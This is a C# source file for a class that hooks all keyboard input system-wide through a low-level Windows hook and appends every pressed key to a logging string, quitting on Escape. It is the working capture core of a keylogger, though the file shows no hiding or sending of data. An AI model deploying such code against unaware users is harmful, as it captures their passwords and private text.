using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace MyMagicKeyWorks.MagicHereLives.KeyWorks
{
   public class KeyListner : MyMagicKeyWorks.MagicHereLives.KeyWorks.Imports.ImportsFromdlls
   {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const string KEY_BREAK_APP = "Escape";
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static ApplicationContext _app;

        public KeyListner(ApplicationContext appcx)
        {
            _app = appcx;
            _hookID = SetHook(_proc);
        }
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, 
                GetModuleHandle(curModule.ModuleName), 0);
            }
        }
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {   
                string key = ((Keys)Marshal.ReadInt32(lParam)).ToString();
                if(key.Equals(KEY_BREAK_APP))
                    _app.ExitThread();          
                Program.Logger += key;              
            }            
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
   }
}
